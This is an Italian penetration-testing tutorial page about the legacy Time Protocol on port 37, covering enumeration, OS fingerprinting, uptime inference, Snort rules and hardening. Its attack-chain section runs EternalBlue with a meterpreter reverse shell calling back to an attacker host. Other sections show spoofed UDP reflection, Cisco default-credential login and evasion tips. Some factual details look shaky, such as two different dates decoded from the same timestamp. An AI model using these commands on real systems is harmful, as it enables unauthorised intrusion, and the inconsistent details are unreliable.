---
title: 'Porta 37 Time Protocol: OS Fingerprinting e Recon su Sistemi Legacy'
slug: porta-37-time
description: >-
  Porta 37 aperta? Time Protocol rivela OS (Windows Server 2003/2008, Cisco
  IOS), timestamp e uptime. Red flag immediato per tecnologia legacy — chain
  verso EternalBlue in 15 minuti.
image: /porta-37-time.webp
draft: false
date: 2026-04-22T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - fingerprinting
  - time protocol
---

La porta 37 espone il **Time Protocol** (RFC 868) — un servizio legacy di sincronizzazione oraria che trasmette timestamp Unix in chiaro su TCP/UDP. Attivo dal 1983, Time Protocol è obsoleto e sostituito da [NTP](https://hackita.it/articoli/ntp) (porta 123), ma persiste in dispositivi embedded, router industriali e sistemi legacy impossibili da aggiornare. In penetration testing, la porta 37 interessa per tre ragioni: **information disclosure** (timezone, uptime system tramite timestamp drift), **time-based attack amplification** (manipolare timestamp per bypass autenticazione time-based), e **fingerprinting OS** via formato risposta timestamp. In CTF, Time Protocol compare raramente ma quando presente indica spesso macchine Windows Server pre-2012 o dispositivi Cisco IOS legacy.

Time Protocol sopravvive solo in ambienti OT/ICS (SCADA, PLC con firmware anni 2000) e laboratori legacy. Ogni security audit considera l'esposizione porta 37 una **low-priority finding** ma utile per reconnaissance passivo e OS fingerprinting senza triggering IDS.

***

## Anatomia tecnica del Time Protocol

Time Protocol opera su **TCP porta 37** e **UDP porta 37**. Il protocollo è estremamente semplice: client si connette, server risponde con 32-bit timestamp, connessione chiude.

**Flow Time Protocol (TCP):**

1. **TCP Handshake** — Client connette porta 37
2. **Timestamp Response** — Server invia 4 byte (big-endian): secondi da 00:00 1 gennaio 1900
3. **Connection Close** — Server chiude subito dopo invio

**Flow Time Protocol (UDP):**

1. **UDP Packet** — Client invia qualsiasi payload (anche vuoto) a porta 37
2. **Timestamp Response** — Server risponde con 4-byte timestamp
3. **No state** — Protocollo stateless

**Formato timestamp:**

```
32-bit unsigned integer (big-endian)
Epoch: 1 gennaio 1900 00:00:00 UTC
Max value: 4,294,967,295 (anno 2036 overflow)
```

Conversione in Unix epoch (1970):

```
Unix_timestamp = Time_protocol_timestamp - 2,208,988,800
```

Le **misconfigurazioni comuni**: Time Protocol abilitato di default su Windows Server 2003/2008 (servizio `W32Time` espone porta 37), router Cisco IOS con `service time` configurato ma non necessario, dispositivi embedded con Time Protocol hardcoded nel firmware.

***

## Enumerazione base

```bash
nmap -sU -sV -p 37 10.10.10.37
```

```
PORT   STATE         SERVICE VERSION
37/udp open|filtered time    Microsoft Windows time
```

**Parametri:** `-sU` UDP scan, `-sV` version detection. Output rivela **Microsoft Windows time** (Windows Server).

**Test manuale TCP:**

```bash
nc -vn 10.10.10.37 37 | xxd
```

```
00000000: d7a5 c8f0                                ....
```

4 byte ricevuti: `0xd7a5c8f0` = 3,618,146,544 secondi da 1900 = \~2014-09-15 (timestamp conversione).

**Test manuale UDP:**

```bash
echo -n "" | nc -u -w 1 10.10.10.37 37 | xxd
```

```
00000000: d7a5 c8f0                                ....
```

Stesso timestamp — server risponde su UDP.

**Script Python per conversione timestamp:**

```python
import socket
import struct
from datetime import datetime

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('10.10.10.37', 37))
data = sock.recv(4)
sock.close()

timestamp = struct.unpack('!I', data)[0]
unix_time = timestamp - 2208988800
dt = datetime.utcfromtimestamp(unix_time)
print(f"[+] Time Protocol timestamp: {timestamp}")
print(f"[+] Unix timestamp: {unix_time}")
print(f"[+] Human readable: {dt} UTC")
```

```
[+] Time Protocol timestamp: 3618146544
[+] Unix timestamp: 1409157744
[+] Human readable: 2014-08-27 12:15:44 UTC
```

***

## Enumerazione avanzata: OS fingerprinting e uptime

### OS fingerprinting via timestamp behavior

```bash
# Windows: risponde su TCP e UDP
nc -vn 10.10.10.37 37 | xxd  # Riceve 4 byte
echo | nc -u 10.10.10.37 37 | xxd  # Riceve 4 byte

# Unix/Linux: raramente abilitato, se presente solo TCP
# Cisco IOS: solo UDP, no TCP
```

**Nmap OS detection con Time Protocol:**

```bash
nmap -O -p 37 10.10.10.37
```

```
37/tcp open  time
Device type: general purpose
Running: Microsoft Windows 2003|2008|XP
OS CPE: cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_server_2008
```

### Uptime estimation via timestamp drift

Interrogare porta 37 ogni 60 secondi, calcolare drift rispetto a orologio attacker:

```bash
# Script bash per monitoring drift
while true; do
  timestamp=$(nc -w 1 10.10.10.37 37 | xxd -p)
  echo "[$(date +%s)] Server timestamp: $timestamp"
  sleep 60
done
```

Se timestamp **non incrementa linearmente** → server ha riavviato (uptime reset) o clock skew anomalo.

***

## Tecniche offensive

### 1. Information disclosure: timezone e locale

```bash
# Timestamp server
python3 -c "import socket,struct,datetime; s=socket.socket(); s.connect(('10.10.10.37',37)); t=struct.unpack('!I',s.recv(4))[0]-2208988800; print(datetime.datetime.utcfromtimestamp(t))"
# 2024-02-06 14:30:00

# Timestamp locale attacker (UTC)
date -u
# Tue Feb  6 14:30:05 UTC 2024

# Differenza: 5 secondi → clock server in sync
# Se differenza >300 secondi → timezone diverso o misconfiguration
```

### 2. Time-based authentication bypass (teorico)

Se applicazione usa timestamp Time Protocol per token generation:

```python
# Recupera timestamp server
import socket, struct
s = socket.socket()
s.connect(('10.10.10.37', 37))
server_time = struct.unpack('!I', s.recv(4))[0] - 2208988800

# Genera token con timestamp server invece di locale
import hashlib
token = hashlib.md5(f"secret{server_time}".encode()).hexdigest()
print(f"Token: {token}")
```

**Scenario:** app web genera session token con `md5(secret + timestamp)`. Se attacker può predire timestamp esatto (via Time Protocol), può forgiare token validi.

### 3. Amplification attack (UDP)

Time Protocol UDP risponde a spoofed source IP:

```bash
# Invia UDP packet con IP sorgente falsificato
hping3 -2 -p 37 -a <victim_IP> -c 1000 10.10.10.37
```

Server Time Protocol invia 4-byte response a `<victim_IP>`. Amplification factor: 1:1 (no amplification reale, ma può saturare se migliaia di server).

**Nota:** amplification attack è inefficace (payload troppo piccolo). Questo è più uno storico curiosity che tecnica pratica.

***

## Scenari pratici

### Scenario 1 — Windows Server 2008 fingerprinting

**Contesto:** CTF box con porta 37 aperta, nessun altro servizio identificato.

```bash
nmap -sU -sV -p 37,123 10.10.10.100
```

```
PORT    STATE SERVICE VERSION
37/udp  open  time    Microsoft Windows time
123/udp open  ntp     NTP v3
```

```bash
# Fingerprint OS via Time Protocol + NTP combo
nmap -O 10.10.10.100
# Running: Microsoft Windows 2008
```

```bash
# Conferma con [nmap](https://hackita.it/articoli/nmap) SMB scan
nmap -p 445 --script=smb-os-discovery 10.10.10.100
# OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
```

**Timeline:** 2 minuti per OS fingerprint completo → targeting exploit Windows Server 2008 (EternalBlue, MS17-010).

### Scenario 2 — Cisco IOS reconnaissance

**Contesto:** router industriale con Time Protocol UDP.

```bash
echo | nc -u -w 1 192.168.1.1 37 | xxd
# 00000000: d7a5 c8f0
```

```bash
# Nessuna risposta TCP
nc -vn 192.168.1.1 37
# Connection refused

# Comportamento: UDP yes, TCP no → likely Cisco IOS
```

```bash
# Conferma con [telnet](https://hackita.it/articoli/telnet) default creds
telnet 192.168.1.1
# Username: cisco
# Password: cisco
Router>
```

**COSA FARE SE FALLISCE:**

* Se nessuna risposta UDP → firewall blocca porta 37, provare [SNMP](https://hackita.it/articoli/snmp) porta 161
* Se timestamp overflow (anno >2036) → device con clock misconfigured, non usare per sync

### Scenario 3 — Time drift detection per service disruption

**Contesto:** embedded device SCADA con Time Protocol.

```bash
# Monitoring timestamp per 10 minuti
for i in {1..10}; do
  python3 -c "import socket,struct; s=socket.socket(); s.connect(('10.10.10.50',37)); print(struct.unpack('!I',s.recv(4))[0])"
  sleep 60
done
```

```
3618146544
3618146604  # +60 secondi
3618146664  # +60 secondi
3618140000  # REBOOT rilevato! Clock reset
```

Device ha riavviato tra minuto 3 e 4 → possibile crash, DoS o manutenzione.

***

## Toolchain integration

**Pipeline recon con Time Protocol:**

```
RECONNAISSANCE
│
├─ nmap -sU -p 37 <target>                  → Detect Time Protocol
├─ nc -vn <target> 37 | xxd                 → Grab timestamp
└─ Python script → convert timestamp        → Human-readable datetime

FINGERPRINTING
│
├─ TCP vs UDP response behavior             → OS type (Windows/Cisco)
├─ Timestamp + NTP correlation              → Clock sync status
└─ Timezone inference                       → Geographic location hint

EXPLOITATION
│
├─ A) Timestamp per time-based token bypass
├─ B) Clock drift monitoring → uptime/reboot detection
└─ C) Amplification (storico, inefficace)

NEXT STEPS
│
└─ OS fingerprint → exploit targeting (Windows: MS17-010, Cisco: default creds)
```

**Tabella comparativa time protocols:**

| Protocol | Porta      | Accuratezza     | Cifratura | Uso moderno              |
| -------- | ---------- | --------------- | --------- | ------------------------ |
| Time     | 37 TCP/UDP | ±1 secondo      | ❌ No      | ❌ Obsoleto (legacy only) |
| Daytime  | 13 TCP/UDP | ±1 secondo      | ❌ No      | ❌ Obsoleto               |
| NTP      | 123 UDP    | ±1 millisecondo | ⚠️ NTPsec | ✅ Standard attuale       |
| PTP      | N/A (L2)   | ±1 nanosecondo  | ❌ No      | ✅ Industrial (IEEE 1588) |

***

## Attack chain completa

**Scenario: Time Protocol → OS fingerprint → SMB exploit**

```
[00:00] RECONNAISSANCE
nmap -sU -sV -p 37,123,445 10.10.10.150

[00:02] TIME PROTOCOL ENUMERATION
nc -vn 10.10.10.150 37 | xxd
# Timestamp ricevuto → Windows Server (TCP+UDP response)

[00:05] OS FINGERPRINTING
nmap -O -p 37,445 --script=smb-os-discovery 10.10.10.150
# Windows Server 2008 R2 SP1

[00:08] EXPLOIT TARGETING
searchsploit windows server 2008 smb
# MS17-010 EternalBlue

[00:10] EXPLOITATION
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.150
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit

[00:15] POST-EXPLOITATION
meterpreter> getuid
# NT AUTHORITY\SYSTEM
```

**Timeline:** 15 minuti da Time Protocol enum a SYSTEM completo.

***

## Detection & evasion

### Lato Blue Team

Log Windows Event (se W32Time logging abilitato):

```
Event ID 35: Time service stopped
Event ID 37: Time provider started
Event ID 50: Time sample rejected (anomaly detection)
```

**IoC critici:**

* Multiple connessioni porta 37 da IP esterno (recon)
* Timestamp query ogni 60 secondi (monitoring script)
* UDP flood porta 37 (amplification attempt)

**IDS rule (Snort):**

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 37 (msg:"Time Protocol TCP Query"; flow:to_server,established; dsize:0; sid:1000060;)
alert udp $EXTERNAL_NET any -> $HOME_NET 37 (msg:"Time Protocol UDP Query"; dsize:<10; sid:1000061;)
```

### Lato Red Team: evasion

Time Protocol è così raro che il semplice uso triggera alert. Evasion:

1. **Single query:** Una sola connessione per timestamp, no loop
2. **Passive listening:** Se Time Protocol broadcast (raro), sniff invece di query
3. **Alternate recon:** Usare [NTP](https://hackita.it/articoli/ntp) porta 123 invece (meno sospetto, più comune)

***

## Performance & scaling

**Single target:**

```bash
time nc -vn 10.10.10.37 37
# real    0m0.050s
```

**Multi-target (subnet):**

```bash
# Scan UDP Time Protocol su /24
nmap -sU -p 37 --open 10.10.10.0/24 -oG time_hosts.txt
# ~5 minuti per /24 (UDP scan lento)

# TCP più veloce
masscan -p37 10.10.10.0/24 --rate 1000
# ~30 secondi per /24
```

***

## Tabelle tecniche

### Command reference

| Comando                            | Scopo                   | Note                       |
| ---------------------------------- | ----------------------- | -------------------------- |
| `nmap -sU -p 37 <target>`          | Scan UDP Time Protocol  | Windows/Cisco detection    |
| `nc -vn <target> 37 \| xxd`        | Grab timestamp TCP      | 4 byte big-endian          |
| `echo \| nc -u <target> 37 \| xxd` | Grab timestamp UDP      | Stateless, spoof-able      |
| `nmap -O -p 37 <target>`           | OS fingerprinting       | Usa Time + altri servizi   |
| Python timestamp converter         | Human-readable datetime | Converte epoch 1900 → 1970 |

### Comparison: Time vs NTP

| Caratteristica     | Time (37)                | NTP (123)                |
| ------------------ | ------------------------ | ------------------------ |
| Accuratezza        | ±1 secondo               | ±1 millisecondo          |
| Protocollo         | TCP/UDP semplice         | UDP complesso (stratums) |
| Sicurezza          | ❌ No auth                | ⚠️ NTPsec con auth       |
| Amplification risk | ❌ Basso (payload 4 byte) | ✅ Alto (DDoS vector)     |
| Uso 2026           | ❌ Legacy only            | ✅ Standard universale    |

***

## Troubleshooting

| Errore                           | Causa                                      | Fix                                    |
| -------------------------------- | ------------------------------------------ | -------------------------------------- |
| `Connection refused` TCP         | Time Protocol non abilitato                | Provare UDP: `nc -u`                   |
| No response UDP                  | Firewall o servizio disabilitato           | Scan altre porte (NTP 123)             |
| Timestamp overflow (>4 miliardi) | Clock server >anno 2036                    | Timestamp invalido, ignorare           |
| `xxd: dump interrupted`          | Server chiude connessione prima di inviare | Normale — server invia 4 byte e chiude |

***

## FAQ

**Time Protocol è ancora usato nel 2026?**

Rarissimo. Solo in: Windows Server 2003/2008 non aggiornati, router Cisco IOS industriali legacy, dispositivi SCADA/PLC con firmware >15 anni. Ogni sistema moderno usa NTP.

**Posso exploitare Time Protocol per RCE?**

No. Il protocollo è read-only (server → client timestamp). Non ci sono CVE storici per RCE. L'unico uso è information disclosure e fingerprinting.

**Come distinguo Time Protocol da altri servizi porta 37?**

Connessione TCP restituisce esattamente 4 byte poi chiude. Altri servizi su porta 37 (rari) avrebbero banner o prompt interattivo.

**Time Protocol può amplificare DDoS?**

Teoricamente sì (UDP reflection), ma inefficace: amplification factor 1:1 (4 byte query → 4 byte response). NTP è 100x più efficace per DDoS.

**Timezone si può ricavare da timestamp?**

No direttamente. Timestamp è sempre UTC. Timezone si può inferire confrontando con NTP locale e orario business tipico (es: se timestamp è 02:00 UTC e attività alta → likely timezone UTC+2).

***

## Cheat sheet finale

| Azione                 | Comando                                                                                           |
| ---------------------- | ------------------------------------------------------------------------------------------------- |
| Scan UDP Time Protocol | `nmap -sU -p 37 <target>`                                                                         |
| Grab timestamp TCP     | `nc -vn <target> 37 \| xxd`                                                                       |
| Grab timestamp UDP     | `echo \| nc -u <target> 37 \| xxd`                                                                |
| Convert timestamp      | `python3 -c "import struct; print(struct.unpack('!I', b'\\xd7\\xa5\\xc8\\xf0')[0] - 2208988800)"` |
| OS fingerprinting      | `nmap -O -p 37 <target>`                                                                          |
| Monitoring drift       | `while true; do nc <target> 37 \| xxd; sleep 60; done`                                            |

***

## Perché Time Protocol è rilevante (legacy awareness)

Nel 2026, Time Protocol è **completamente obsoleto** ma persiste in ambienti legacy impossibili da migrare: impianti industriali SCADA operativi da 20+ anni, router Cisco IOS in reti isolate (oil & gas, utilities), Windows Server 2003/2008 in sistemi medicali certificati FDA (aggiornamento richiederebbe ri-certificazione pluriennale). In pentest, trovare porta 37 aperta è **instant red flag** per presenza di tecnologia legacy vulnerabile.

## Differenze Time vs NTP

Time Protocol (1983) è stato sostituito da NTP (1985) per accuracy superiore. Time fornisce timestamp statico, NTP sincronizza continuamente con stratums gerarchici. Security-wise, entrambi sono vulnerabili senza autenticazione, ma NTP ha NTPsec (crypto) mentre Time non ha protezioni.

## Hardening: disabilitare Time Protocol

**Windows Server:**

```powershell
# Stop servizio W32Time porta 37
Stop-Service W32Time
Set-Service W32Time -StartupType Disabled

# Firewall block
New-NetFirewallRule -DisplayName "Block Time Protocol" -Direction Inbound -Protocol TCP -LocalPort 37 -Action Block
New-NetFirewallRule -DisplayName "Block Time Protocol UDP" -Direction Inbound -Protocol UDP -LocalPort 37 -Action Block
```

**Cisco IOS:**

```
Router(config)# no service time
Router(config)# access-list 100 deny udp any any eq 37
Router(config)# access-list 100 deny tcp any any eq 37
```

**Linux (se xinetd):**

```bash
# /etc/xinetd.d/time
service time
{
    disable = yes
}
systemctl restart xinetd
```

## OPSEC: Time Protocol in recon

Time Protocol è **estremamente raro** — qualsiasi query triggera alert in ambienti monitored. Preferire:

1. **NTP queries** (porta 123) — indistinguibile da traffico legittimo
2. **Passive OS fingerprinting** — [nmap](https://hackita.it/articoli/nmap) senza connettersi direttamente porta 37
3. **Alternate timing sources** — HTTP Date headers, SMTP timestamps

***

> **Disclaimer:** Tutti i comandi sono destinati esclusivamente all'uso in ambienti autorizzati: laboratori personali, macchine CTF e penetration test con autorizzazione scritta. L'autore e HackIta declinano ogni responsabilità per usi impropri. Documentazione ufficiale: RFC 868 ([https://www.rfc-editor.org/rfc/rfc868.html](https://www.rfc-editor.org/rfc/rfc868.html)).

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
